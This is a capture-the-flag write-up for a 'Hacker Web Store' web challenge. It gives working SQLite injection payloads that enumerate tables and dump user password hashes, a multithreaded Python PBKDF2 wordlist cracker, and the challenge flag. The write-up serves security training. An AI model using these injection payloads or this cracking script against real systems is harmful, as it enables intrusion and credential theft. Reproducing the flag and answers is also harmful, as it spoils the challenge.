## Hacker Web Store
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/69ba4168-2f45-4add-bc48-aaae3fe9002d)

## Enumeration

We are presented with a simple webpage with only two options. The option to create a product, and to login as admin, however we don't know the credentials yet. Despite the challenge providing a `password_list.txt` file, we are not allowed to bruteforce the login as it is against the rules. This means that the wordlist must be used for something else.  

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/00afb789-f641-461d-beb7-3631699f645a)

When creating a product or simply accessing the page, a Flask cookie is assigned to us and if we use `flask-unsign` to decode it, we can see it mentioning a `sqlite` database.  

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/2452b806-997c-4785-beb6-c9f3c0671654)

When creating a product with a single quote in either boxes, we will get a SQL error and also shows that we are in an INSERT statement.

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/dbfa7579-a9ed-4a04-ad87-8f69e82ed375)

We can use the payload below to get the first table name.

```sql
' || (SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'))--
```

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/379ef332-d7a5-421f-b3fa-e12bcca8e9a1)

Then we can get the column names of the users table:
```sql
' || (SELECT sql FROM sqlite_master WHERE type='table' AND tbl_name='users'))--
```
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/911505de-b506-437d-bdea-8ccdb4c389fa)

And now we can easily get all the names and passwords.
```sql
' || (SELECT group_concat(name || ' ' || password, ' ') FROM users))--
```

```text
Joram pbkdf2:sha256:600000$m28HtZYwJYMjkgJ5$2d481c9f3fe597590e4c4192f762288bf317e834030ae1e069059015fb336c34
James pbkdf2:sha256:600000$GnEu1p62RUvMeuzN$262ba711033eb05835efc5a8de02f414e180b5ce0a426659d9b6f9f33bc5ec2b
website_admin_account pbkdf2:sha256:600000$MSok34zBufo9d1tc$b2adfafaeed459f903401ec1656f9da36f4b4c08a50427ec7841570513bf8e57
```

Unfortunately it looks like these are not hashes recognized either by John or Hashcat. But they do follow a standard practice of password hashing using iterations and salt so we can code this.

## Solution

When I say "we", I mean ChatGPT can and I can then validate the code.

```python
import hashlib
import concurrent.futures

def generate_pbkdf2_hash(password, salt, iterations=600000):
    # Encode the password and salt as bytes
    password_bytes = password.encode('utf-8')
    salt_bytes = salt.encode('utf-8')

    # Generate the hash using PBKDF2 with HMAC-SHA256
    hash_bytes = hashlib.pbkdf2_hmac('sha256', password_bytes, salt_bytes, iterations)

    # Convert the hash bytes to a hexadecimal string representation
    hash_hex = hash_bytes.hex()

    # Format the hash string in the desired format
    formatted_hash = f"pbkdf2:sha256:{iterations}${salt}${hash_hex}"

    return formatted_hash

def crack_password(target_hash, salt, iterations, password_list_file):
    with open(password_list_file, 'r') as f:
        password_list = [line.strip() for line in f]

    # Define a function to generate hashes in parallel
    def generate_hashes(password):
        generated_hash = generate_pbkdf2_hash(password, salt, iterations)
        return (password, generated_hash)

    # Use concurrent.futures to execute hash generation in parallel
    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = [executor.submit(generate_hashes, password) for password in password_list]

        # Iterate over completed futures to check for a match
        for future in concurrent.futures.as_completed(futures):
            password, generated_hash = future.result()
            if generated_hash == target_hash:
                return password

    return None

# Example usage
target_hash = 'pbkdf2:sha256:600000$MSok34zBufo9d1tc$b2adfafaeed459f903401ec1656f9da36f4b4c08a50427ec7841570513bf8e57'
salt = 'MSok34zBufo9d1tc'
iterations = 600000
password_list_file = 'password_list.txt'

cracked_password = crack_password(target_hash, salt, iterations, password_list_file)
if cracked_password:
    print("Password cracked:", cracked_password)
else:
    print("Password not found in the wordlist.")
```

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/d5c040de-8d35-4284-8374-f82376814c8e)

Now we login as admin and get the flag:

`flag{87257f24fd71ea9ed8aa62837e768ec0}`
